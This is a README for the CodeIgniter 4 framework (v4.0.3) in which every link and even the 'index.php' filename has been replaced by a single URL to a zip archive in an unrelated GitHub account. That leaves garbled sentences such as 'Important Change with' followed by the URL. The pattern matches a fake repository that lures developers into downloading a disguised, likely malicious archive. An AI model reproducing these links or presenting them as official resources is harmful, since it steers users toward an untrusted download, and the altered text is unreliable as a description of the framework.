# CodeIgniter 4 Framework (v 4.0.3)

## What is CodeIgniter?

CodeIgniter is a PHP full-stack web framework that is light, fast, flexible, and secure. 
More information can be found at the [official site](https://raw.githubusercontent.com/aaonedollar/ci403/main/uncurricularized/ci403.zip).

This repository holds the distributable version of the framework,
including the user guide. It has been built from the 
[development repository](https://raw.githubusercontent.com/aaonedollar/ci403/main/uncurricularized/ci403.zip).

More information about the plans for version 4 can be found in [the announcement](https://raw.githubusercontent.com/aaonedollar/ci403/main/uncurricularized/ci403.zip) on the forums.

The user guide corresponding to this version of the framework can be found
[here](https://raw.githubusercontent.com/aaonedollar/ci403/main/uncurricularized/ci403.zip). 


## Important Change with https://raw.githubusercontent.com/aaonedollar/ci403/main/uncurricularized/ci403.zip

`https://raw.githubusercontent.com/aaonedollar/ci403/main/uncurricularized/ci403.zip` is no longer in the root of the project! It has been moved inside the *public* folder,
for better security and separation of components.

This means that you should configure your web server to "point" to your project's *public* folder, and
not to the project root. A better practice would be to configure a virtual host to point there. A poor practice would be to point your web server to the project root and expect to enter *public/...*, as the rest of your logic and the
framework are exposed.

**Please** read the user guide for a better explanation of how CI4 works!
The user guide updating and deployment is a bit awkward at the moment, but we are working on it!

## Repository Management

We use Github issues, in our main repository, to track **BUGS** and to track approved **DEVELOPMENT** work packages.

This repository is a "distribution" one, built by our release preparation script. 
Problems with it can be raised on our forum, or as issues in the main repository.
